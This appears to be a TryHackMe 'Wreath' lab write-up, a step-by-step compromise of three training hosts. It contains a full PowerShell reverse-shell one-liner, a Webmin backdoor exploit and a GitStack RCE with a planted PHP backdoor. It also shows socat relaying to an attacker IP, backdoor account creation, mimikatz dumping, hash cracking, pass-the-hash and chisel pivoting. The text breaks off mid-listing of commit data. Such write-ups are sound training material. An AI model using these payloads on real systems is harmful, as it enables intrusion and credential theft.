# TryHackMe-Wreath
# Wreath

# Enumeration

```
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.200.188.200
Nmap scan report for 10.200.188.200
Host is up (0.18s latency).
Not shown: 65530 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-09-13T05:50:09
| Not valid after:  2022-09-13T05:50:09
| MD5:   83cc b3b9 beaf 66b2 90fb 2be6 ca0c c8b1
|_SHA-1: de73 3739 1792 4097 945b 10d8 95f8 a0b7 6fd4 1697
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 97DCBED1D0D1E50658CE7D98C382AEA8
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

Nmap reveals four open ports, port 80 is redirecting to https://thomaswreath[.]thm, on non-standard port 10000 WebMin is running. This scan also reveals it’s ‘centOS’, based on port 443 service version. Lets add this DNS to our hosts file.

```
⛩\> sudo sh -c "echo '10.200.188.200  thomaswreath.thm' >> /etc/hosts"
```

Now let’s visit the default web server port.

![Screen Shot 2021-09-12 at 23.52.16.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/7B41CC20-1878-4A6A-B6A0-D2ABEB7F5C93_2/Screen%20Shot%202021-09-12%20at%2023.52.16.png)

On homepage there are no any links, this is just a CV of Thomas Wreath. Let’s take a look into web server that is running on non-standard port.

![Screen Shot 2021-09-13 at 00.12.53.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/3F4BEC3E-096E-49C1-B8CB-ECFFFB60AC21_2/Screen%20Shot%202021-09-13%20at%2000.12.53.png)

WebMin service is running on port 10000, however without credentials we can’t move forward. The running WebMin version (from nmap) is 1.890 which was released in October 10, 2018 and current stable version is 1.981. The running version might have vulnerabilities which we can take advantage.

[Webmin](https://www.webmin.com/exploit.html)

> TL;DR CVE-2019-15107 Webmin version 1.890 was released with a backdoor that could allow anyone with knowledge of it to execute commands as root. Versions 1.900 to 1.920 also contained a backdoor using similar code, but it was not exploitable in a default Webmin install. Only if the admin had enabled the feature at Webmin -> Webmin Configuration -> Authentication to allow changing of expired passwords could it be used by an attacker. The vulnerability only appears in the version of the code that was released on Sourceforge and not the version that was on GitHub. The backdoor was first introduced in version 1.890 and was also included in 1.900 and 1.920.

This running version has a backdoor in it. Metasploit module is already available to exploit this backdoor.

[Webmin password_change.cgi Backdoor](https://www.rapid7.com/db/modules/exploit/unix/webapp/webmin_backdoor/)

We can use MSF to gain shell access, but we will use manual method.

> [https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/](https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/) 
> [https://medium.com/@knownsec404team/backdoor-exploration-of-webmin-remote-code-execution-vulnerabilities-cve-2019-15107-55234c0bd486](https://medium.com/@knownsec404team/backdoor-exploration-of-webmin-remote-code-execution-vulnerabilities-cve-2019-15107-55234c0bd486)

The backdoor is in the form of ‘code execution’ inside password_change.cgi file. The below link explains how the code execution is happening.

[Receiving perl execution failed - Your password has expired (at /usr/share/webmin/password_change.cgi line 12) · Issue #947 · webmin/webmin](https://github.com/webmin/webmin/issues/947)

![Screen Shot 2021-09-13 at 03.19.11.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/6E8A7E81-BC15-4BC2-9FD2-033A813CE882_2/Screen%20Shot%202021-09-13%20at%2003.19.11.png)

Backdoor: `$in{'expired'} eq '' || die $text{'password_expired'},qx/$in{'expired'}/;`

Based on the vulnerability, we can craft our own POST request with header and data to get code execution.

![Screen Shot 2021-09-13 at 03.30.38.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/79A0360B-D7BB-44A9-B88F-94F3E41FAD60_2/Screen%20Shot%202021-09-13%20at%2003.30.38.png)

We go the code execution. Now we need to get a shell access. Setup a listener and pass the bash one-liner.

![Screen Shot 2021-09-13 at 03.34.39.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/25CDB154-241F-4582-A036-F8C47C8C8252_2/Screen%20Shot%202021-09-13%20at%2003.34.39.png)

```shell
⛩\> pwncat -lp 9001
[10:34:22] Welcome to pwncat 🐈!                                                                                                                __main__.py:143
[10:34:31] received connection from 10.200.188.200:59166                                                                                             bind.py:57
[10:34:33] 0.0.0.0:9001: normalizing shell path                                                                                                  manager.py:502
[10:34:34] 10.200.188.200:59166: registered new host w/ db                                                                                       manager.py:502
(local) pwncat$
(remote) root@prod-serv:/usr/libexec/webmin/# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
```

As we are already root, there’s no need to escalate privileges. However, we have to perform post-exploitation process to find  hosts in the same network. We can start by looking into ARP cache.

```
(remote) root@prod-serv:/root# arp -a

ip-10-200-188-1.eu-west-1.compute.internal (10.200.188.1) at 02:74:1d:9c:65:4f [ether] on eth0
ip-10-200-188-150.eu-west-1.compute.internal (10.200.188.150) at 02:48:97:0c:dd:d9 [ether] on eth0
ip-10-200-188-100.eu-west-1.compute.internal (10.200.188.100) at 02:e6:a9:4c:30:eb [ether] on eth0
```

As you can see the cache has two more IP address. Let’s try to ping them .

```
(remote) root@prod-serv:/root# ping 10.200.188.100 -c 2
PING 10.200.188.100 (10.200.188.100) 56(84) bytes of data.

--- 10.200.188.100 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 8ms

(remote) root@prod-serv:/root# ping 10.200.188.150 -c 2
PING 10.200.188.150 (10.200.188.150) 56(84) bytes of data.

--- 10.200.188.150 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 36ms
```

Both IP are not reachable via ping (ICMP). Perhaps ICMP is blocked on the both IP. Let’s try ARP Ping.

```
(remote) root@prod-serv:/root# arping -c 4 10.200.188.100
ARPING 10.200.188.100 from 10.200.188.200 eth0
Unicast reply from 10.200.188.100 [02:E6:A9:4C:30:EB]  0.647ms
Unicast reply from 10.200.188.100 [02:E6:A9:4C:30:EB]  0.678ms
Unicast reply from 10.200.188.100 [02:E6:A9:4C:30:EB]  0.662ms
Unicast reply from 10.200.188.100 [02:E6:A9:4C:30:EB]  0.677ms
Sent 4 probes (1 broadcast(s))
Received 4 response(s)

(remote) root@prod-serv:/root# arping -c 4 10.200.188.150
ARPING 10.200.188.150 from 10.200.188.200 eth0
Unicast reply from 10.200.188.150 [02:48:97:0C:DD:D9]  0.639ms
Unicast reply from 10.200.188.150 [02:48:97:0C:DD:D9]  0.663ms
Unicast reply from 10.200.188.150 [02:48:97:0C:DD:D9]  0.636ms
Unicast reply from 10.200.188.150 [02:48:97:0C:DD:D9]  0.647ms
Sent 4 probes (1 broadcast(s))
Received 4 response(s)
```

[Ping: ICMP vs. ARP - Linux.com](https://www.linux.com/news/ping-icmp-vs-arp/)

We got response from ARP. The IP’s are up but they are blocking ICMP request. Let’s upload static NMAP binary file on the machine and scan the whole subnet for IP and ports.

```
(remote) root@prod-serv:/tmp# ./nmap_static -sn 10.200.188.1/24 --exclude 10.200.188.1,10.200.188.250

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-09-13 13:22 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-188-100.eu-west-1.compute.internal (10.200.188.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00017s latency).

MAC Address: 02:E6:A9:4C:30:EB (Unknown)
Nmap scan report for ip-10-200-188-150.eu-west-1.compute.internal (10.200.188.150)
Host is up (0.0012s latency).

MAC Address: 02:48:97:0C:DD:D9 (Unknown)
Nmap scan report for ip-10-200-188-200.eu-west-1.compute.internal (10.200.188.200)
Host is up.
Nmap done: 254 IP addresses (3 hosts up) scanned in 3.53 seconds
```

I have excluded two IPs as mentioned in the THM room. We have three IPs and one of them (.200) is already rooted machine. Let’s find open ports on these two IPs.

```
(remote) root@prod-serv:/tmp# ./nmap_static -F 10.200.188.150 10.200.188.100

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-09-13 13:23 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.

Nmap scan report for ip-10-200-188-150.eu-west-1.compute.internal (10.200.188.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00035s latency).
Not shown: 5801 filtered ports
Host is up (0.00035s latency).
Not shown: 5801 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
20000/tcp open  dnp
MAC Address: 02:48:97:0C:DD:D9 (Unknown)

Nmap scan report for ip-10-200-188-100.eu-west-1.compute.internal (10.200.188.100)
Host is up (-0.20s latency).
All 5805 scanned ports on ip-10-200-188-100.eu-west-1.compute.internal (10.200.188.100) are filtered
MAC Address: 02:E6:A9:4C:30:EB (Unknown)
```

Only .150 IP address gave us the result on open ports. Perhaps .100 IP is not accessible from .200. Let’s enumerate .150 open ports further. For version and script scan the static binary will not help as it doesn’t have access to nmap-services and NSE. So, let’s dump the SSH private key to your machine and tunnel all the network.

```
(remote) root@prod-serv:/root/.ssh# head id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs0oHYlnFUHTlbuhePTNoITku4OBH8OxzRN8O3tMrpHqNH3LHaQRE
```

We will use ‘sshuttle’ application for tunneling purpose.

[Overview — sshuttle 1.0.5 documentation](https://sshuttle.readthedocs.io/en/stable/overview.html)

```
⛩\> sshuttle -r root@thomaswreath.thm -e 'ssh -i id_rsa' -N
c : Connected to server.
```

\-N flag will automatically determine subnets to route.

Now we have connected to target via sshuttle, now we can enumerate further.

```
⛩\> nmap -p 80,3389,5985,20000 -sV -sC 10.200.188.150
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 12:44 UTC
Nmap scan report for 10.200.188.150
Host is up (0.00056s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.2.22 ((Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3)
|_http-server-header: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3
|_http-title: Page not found at /
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GIT-SERV
|   NetBIOS_Domain_Name: GIT-SERV
|   NetBIOS_Computer_Name: GIT-SERV
|   DNS_Domain_Name: git-serv
|   DNS_Computer_Name: git-serv
|   Product_Version: 10.0.17763
|_  System_Time: 2021-09-13T12:45:13+00:00
| ssl-cert: Subject: commonName=git-serv
| Not valid before: 2021-09-11T22:13:22
|_Not valid after:  2022-03-13T22:13:22
|_ssl-date: 2021-09-13T12:45:15+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
20000/tcp open  nagios-nsca   Nagios NSCA
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.54 seconds
```

Nmap reveals hostname and OS (Windows) info. Let’s access the HTTP.

![Screen Shot 2021-09-13 at 05.47.52.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/97FC19AA-2179-4781-A38E-0F8158F53D3C_2/Screen%20Shot%202021-09-13%20at%2005.47.52.png)

Django web framework is running and it’s debug feature is enabled. As it is showing couple endpoints, let’s access them.

![Screen Shot 2021-09-13 at 05.53.13.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/C5A563F1-148A-4E0E-9D61-08E830C26625_2/Screen%20Shot%202021-09-13%20at%2005.53.13.png)

We got gitstack login page, but the default creds will not work. Let’s look for any RCE in GitStack.

```
⛩\> searchsploit 'gitstack'
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                                                                             | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                                                           | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                                                                      | php/webapps/43777.py
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let’s proceed with 2.3.10 RCE.

```
⛩\> searchsploit -m 43777
  Exploit: GitStack 2.3.10 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/43777
     Path: /usr/share/exploitdb/exploits/php/webapps/43777.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/thm/wreath/43777.py
```

[exploits/GitStack at master · kacperszurek/exploits](https://github.com/kacperszurek/exploits/tree/master/GitStack)

> [https://owasp.org/www-chapter-ghana/assets/slides/OWASP_Gitstack_Presentation.pdf](https://owasp.org/www-chapter-ghana/assets/slides/OWASP_Gitstack_Presentation.pdf)

> TL;DR CVE-2018-5955

> An unauthenticated action in GitStack that allows a remote attacker to add new users and then trigger remote code execution. an attacker can create a repository from a remote location and prevent s from accessing our new repository. In the repository, an attacker can upload a backdoor and use it to execute code.

Edit the python (POC) script to add target IP address and change backdoor file name.

```
⛩\> python2.7 git_rce.py

[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work.

[+] Execute command
"nt authority\system"
```

We got code execution and our php backdoor file is on server. If you want to code execution again we don’t need to run this POC script, but we can take advantage of our PHP backdoor file.

```
⛩\> curl 'http://10.200.188.150/web/exploit_rce.php' --data 'a=whoami'
"nt authority\system"
```

As you can see we have access to machine via our backdoor file. Let’s forward this request to burp suite and try to gain shell access.

```
⛩\> curl 'http://10.200.188.150/web/exploit_rce.php' --data 'a=whoami' --proxy http://127.0.0.1:8080
```

![Screen Shot 2021-09-13 at 23.19.58.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/EC6A44B8-3B51-4CBB-95F7-7D5C3834C4A3_2/Screen%20Shot%202021-09-13%20at%2023.19.58.png)

Before we try to gain shell access, try to get a ping back. As you can see it’s request timed out, that means this machine (.150) can’t connect to our IP (Kali Linux). However it can connect to web server (.200).

![Screen Shot 2021-09-13 at 23.24.09.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/B3D669D9-CDBE-4228-86C4-92FB7D3FA9D9_2/Screen%20Shot%202021-09-13%20at%2023.24.09.png)

So, we can open a port on web server and forward that traffic to our Kali machine. We can achieve this objective using ‘socat’ application. But first, we need to add a firewall rule to accept the incoming connection on specific port.

```
(remote) root@prod-serv:/root# firewall-cmd --zone=public --add-port 31337/tcp
success
```

Now that we have added a rule, let’s run socat and listen on that previously opened port and forward the traffic to our IP address (Kali Linux) on a different port.

```
(remote) root@prod-serv:/tmp# ./socat_fwd tcp-listen:31337 tcp:10.50.185.80:9001 &
[1] 2667
```

Let’s start a listener on Kali machine.

```
⛩\> rlwrap nc -lvnp 9001
listening on [any] 9001 ...
```

We will use powershell one-liner to gain shell access.

> [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.188.200',31337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

![Screen Shot 2021-09-14 at 06.35.19.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/2596D3EA-61BF-4412-9BF5-6A0B98D7195A_2/Screen%20Shot%202021-09-14%20at%2006.35.19.png)

Make sure to URL encode the one-liner and forward the request to server. Check the netcat listener for reverse connection.

```
⛩\> rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.50.185.80] from (UNKNOWN) [10.200.188.200] 55882

PS C:\GitStack\gitphp> whoami
nt authority\system
```

We have shell access now. We already know that 5985 (WinRM) port is open on this Windows machine for remote management. Let’s create new user account and that user to remote management users group.

```
PS C:\GitStack\gitphp> net user test-account test123 /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators test-account /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" test-account /add
The command completed successfully.
```

Now we can access the windows machine via RDP or WinRM. Let’s get a stable shell via Evil-WinRM.

```
⛩\> evil-winrm -u test-account -p 'test123' -i 10.200.188.150

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\test-account\Documents> whoami
git-serv\test-account
```

We have shell access with new user privileges. Let’s dump credentials of  users using ‘mimikatz’ application. For that we need GUI access of Windows, we can use ‘Remmina’ or ‘xFreerdp’ application, and we can use newly created account credentials to login. But before we have GUI access, we need to upload ‘mimikatz’ on the machine. We can do that using Evil-WinRM.

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\test-account\Documents> upload /tmp/mimikatz.exe

Info: Uploading /tmp/mimikatz.exe to C:\Users\test-account\Documents\mimikatz.exe

Data: 1745928 bytes of 1745928 bytes copied

Info: Upload successful!
```

Now connect to RDP with new account creds.

![Screen Shot 2021-09-14 at 07.15.02.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/CABE5206-9C6F-401C-8765-0AE59360306D_2/Screen%20Shot%202021-09-14%20at%2007.15.02.png)

If it fails for some reason, try it couple more times or use ‘xfreerdp’ application. Once you successfully login via RDP, open cmd with admin privileges.

![Screen Shot 2021-09-14 at 07.09.38.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/835C5868-406E-489B-A55B-64CA4AC0960E_2/Screen%20Shot%202021-09-14%20at%2007.09.38.png)

Once you have access to cmd prompt, we need to execute ‘mimikatz’ application and dump the user creds.

![Screen Shot 2021-09-14 at 07.25.44.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/570760C4-832D-4708-B166-E454C55F35CD_2/Screen%20Shot%202021-09-14%20at%2007.25.44.png)

Check privileges and impersonate system.

![Screen Shot 2021-09-14 at 07.34.44.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/DEE0509F-2D2B-4955-ADB6-373624F1CCDD_2/Screen%20Shot%202021-09-14%20at%2007.34.44.png)

Now we dump the hash of rest of the users and look for administrator hash and thomas users hash.

![Screen Shot 2021-09-14 at 07.58.54.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/372F48DC-1150-4D0C-B621-BA3D227BAF49_2/Screen%20Shot%202021-09-14%20at%2007.58.54.png)

![Screen Shot 2021-09-14 at 07.59.22.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/C9710223-E625-45C9-AD06-F81DF973F328_2/Screen%20Shot%202021-09-14%20at%2007.59.22.png)

We got admin and Thomas user hash. Let’s crack user hash using hashcat.

```
⛩\> hashcat '02d90eda8f6b6b06c32d5f207831101f' -m 1000 -a 0 /usr/share/wordlists/rockyou.txt

-------------------SNIP--------------------

02d90eda8f6b6b06c32d5f207831101f:i<3ruby

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 02d90eda8f6b6b06c32d5f207831101f
Time.Started.....: Tue Sep 14 15:03:29 2021 (3 secs)
Time.Estimated...: Tue Sep 14 15:03:32 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2219.5 kH/s (0.15ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7485440/14344385 (52.18%)
Rejected.........: 0/7485440 (0.00%)
Restore.Point....: 7483392/14344385 (52.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: i@loveanthony -> i69_landon

Started: Tue Sep 14 15:03:11 2021
Stopped: Tue Sep 14 15:03:34 2021

-------------------SNIP--------------------
```

We cracked the user hash and got the password. This can be used for later purpose. Let’s login to admin account using pass the hash technique.

```
⛩\> evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.188.150

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> whoami
git-serv\administrator
```

So far we have successfully compromised two machines (.200 & .150). The only remaining machine is .100, this is Thomas’ personal computer. Let’s find open ports on that machine.

```
⛩\> evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.185.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
```

We have to load powershell scripts with Evil-WinRM.

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> Invoke-Portscan.ps1

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.185.100 -TopPorts 50

Hostname      : 10.200.185.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 110, 21...}
finishTime    : 9/15/2021 6:04:18 AM
```

Two ports are open on .100 machine, port 80 and 3389. our Kali machine don’t have direct access to .100 machine. To access port 80 of .100 machine, we need to tunnel the traffic to .150. As we already have access to .150 we can easily do that with ‘Chisel’ application.

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> upload ~/tools/chisel_bin/chisel_win.exe
Info: Uploading ~/tools/chisel_bin/chisel_win.exe to C:\Users\Administrator\Documents\chisel_win.exe


Data: 11397800 bytes of 11397800 bytes copied

Info: Upload successful!

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="port-fwd" dir=in action=allow protocol=tcp localport=13377
Ok.
```

After uploading Chisel, we need to add a firewall rule to allow a specific TCP port. After that we need to start the Chisel server on that same port.

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> .\chisel_win.exe server -p 13377 --socks5
2021/09/15 06:21:22 server: Listening on http://0.0.0.0:13377
```

Now we need to connect to that server from our Kali machine and tunnel all our traffic via socks proxy.

```
⛩\> ./chisel client 10.200.185.150:13377 13388:socks
2021/09/15 05:24:39 client: Connecting to ws://10.200.185.150:13377
2021/09/15 05:24:39 client: tun: proxy#127.0.0.1:13388=>socks: Listening
2021/09/15 05:24:40 client: Connected (Latency 167.746789ms)
```

It’s connected to our chisel server. Now we need to configure our browser to connect .100 machine via socks proxy address. I am using ‘Foxy Proxy’ add-on for firefox to switch easily my predefined proxies.

![Screen Shot 2021-09-14 at 22.27.22.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/2C50B3E1-3DBA-49D8-B9E5-5AA889F7951E_2/Screen%20Shot%202021-09-14%20at%2022.27.22.png)

Make sure to use the same port which we used in previous command. Then try top access the .100 IP from browser.

![Screen Shot 2021-09-14 at 22.30.33.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5C3EE489-35ED-4B29-A0C9-5BF9A7CCFF83/FAF1AE08-7BD7-4018-A72A-CC044F94D185_2/Screen%20Shot%202021-09-14%20at%2022.30.33.png)

This looks like the same website as .200 and it’s source is on .150. Let’s download it to our Kali machine using new Evil-WinRM session.

```
⛩\> evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.185.150

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> download c:\gitstack\repositories\website.git
Info: Downloading c:\gitstack\repositories\website.git to website.git


Info: Download successful!
```

It’s downloaded, now we need to extract .git directory from the source and recreate the repository in a readable format. But first rename the subdirectory of downloaded directory to .git

```
⛩\> cd Website.git/

⛩\> mv C\:\\GitStack\\repositories\\Website.git/ .git
```

> Now we need to extract with GitTools [https://github.com/internetwache/GitTools](https://github.com/internetwache/GitTools)

```
⛩\> ~/tools/GitTools/Extractor/extractor.sh . website
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...

-----------------SNIP-----------------
```

All the extracted data will be in website directory. Let’s check the extracted data.

```
⛩\> cd website/

⛩\> ls
0-70dde80cc19ec76704567996738894828f4ee895  1-345ac8b236064b431fa43f53d91c98c4834ef8f3  2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
```

There are three commits, but we don’t know which one is initial commit. Using below one-liner we can get parent value (hash), based on that we can guess our initial commit.

```
⛩\> separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"


=======================================
0-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit


=======================================
1-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter


=======================================
2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

